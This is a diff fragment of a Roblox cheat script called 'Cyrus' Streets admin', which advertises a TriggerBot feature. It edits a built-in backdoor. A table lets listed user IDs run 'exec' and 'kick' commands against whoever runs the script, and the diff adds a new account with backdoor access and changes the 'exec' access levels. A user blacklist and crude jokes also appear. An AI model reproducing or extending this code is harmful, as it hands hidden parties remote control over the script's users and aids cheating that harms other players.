@@ -202,7 +202,7 @@ local BackDoorTableCommands = {
 	};
 	['exec'] = {
 		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then CheckCommand(Content) end end;
-		['Levels'] = {[2] = true;[3] = true;[4] = true;}
+		['Levels'] = {[3] = true;[4] = true;}
 	};
 	['kick'] = {
 		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then LP:Kick(Content) end end;
@@ -293,7 +293,12 @@ local BackDoorTablePlayers = {
 		['Name'] = "Randomly paid me 5 dollars";
 		['Access'] = 1;
 		['Colour'] = Color3.fromRGB(255,0,255);
-	}
+	};
+	[612618136] = {
+		['Name'] = "Nigerian prince (Bird)";
+		['Access'] = 2;
+		['Colour'] = Color3.fromRGB(125,0,0);
+	};
 }
 
 local BlacklistTable = {
@@ -3127,7 +3132,7 @@ end))
 -- [[ End ]] --
 
 notif("Cyrus' Streets admin","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: nXcZH36)",10,"rbxassetid://2474242690") -- string.format remains superior - Slays.
-notif("Newest Update","Xray [WireFrame/No Args] (WireFrame kills fps)",10,nil)
+notif("Newest Update","TriggerBot more like CancerBot (it's more op now)",10,nil)
 
 if LP:IsInGroup(5152759) or string.find(LP.Name:lower(),"lynx") or BlacklistTable[LP.UserId] then
 	notif("HA YOU THOUGHT","no!!",5,nil)
